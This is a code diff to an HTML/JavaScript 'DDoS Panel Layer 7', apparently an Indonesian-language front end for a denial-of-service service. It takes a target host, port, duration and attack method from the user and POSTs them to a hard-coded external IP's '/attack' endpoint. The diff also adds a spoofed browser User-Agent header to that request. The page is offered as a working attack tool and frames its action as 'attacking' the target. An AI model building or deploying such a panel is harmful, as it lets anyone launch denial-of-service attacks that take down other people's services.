@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DDoS Panel</title>
+    <title>DDoS Panel Layer 7</title>
     <style>
         body {
             background-color: #121212;
@@ -66,7 +66,7 @@
             let host = document.getElementById("host").value;
             let port = document.getElementById("port").value;
             let time = document.getElementById("time").value;
-            let method = document.getElementById("method").value.toUpperCase(); // Ubah jadi huruf besar
+            let method = document.getElementById("method").value.toUpperCase();
             let log = document.getElementById("log");
 
             if (!host || !port || !time) {
@@ -76,10 +76,12 @@
 
             log.innerHTML = `🚀 Menyerang <b>${host}:${port}</b> dengan metode <b>${method}</b> selama <b>${time}</b> detik...`;
 
-            // Kirim request ke API DDoS
-            fetch("http://64.227.139.46:4877/", {
+            fetch("http://64.227.139.46:4877/attack", {
                 method: "POST",
-                headers: { "Content-Type": "application/json" },
+                headers: {
+                    "Content-Type": "application/json",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
+                },
                 body: JSON.stringify({ host, port, time, method })
             })
             .then(response => response.json())
@@ -89,4 +91,4 @@
     </script>
 
 </body>
-  </html>
+</html>
